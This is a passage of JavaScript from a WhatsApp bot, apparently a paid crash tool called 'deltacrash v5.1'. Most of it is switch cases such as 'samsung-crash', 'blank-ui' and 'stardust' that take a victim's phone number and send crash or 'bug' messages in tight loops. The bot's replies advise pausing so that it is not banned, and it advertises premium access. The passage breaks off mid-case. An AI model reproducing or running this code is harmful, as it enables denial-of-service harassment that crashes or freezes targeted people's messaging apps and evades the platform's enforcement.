let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-external': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-crash': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-reboot': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'samsung-bug': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-quoted': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case "bug-engine": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-dark": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "eror-bug": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "walking-bug": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anything-crash": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-ui": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-ui": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-external": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-internal": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-crash": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'internal-quoted': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'external-quoted': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'stardust': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 40; j++) {
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'self': {
if (!isOwner) return reply(mess.only.owner)
deltaxcrash.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
deltaxcrash.public = true
reply('succes')
}
break
//=================================================//
case '🌷': case '💥': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case '⭐': case '⚡': {

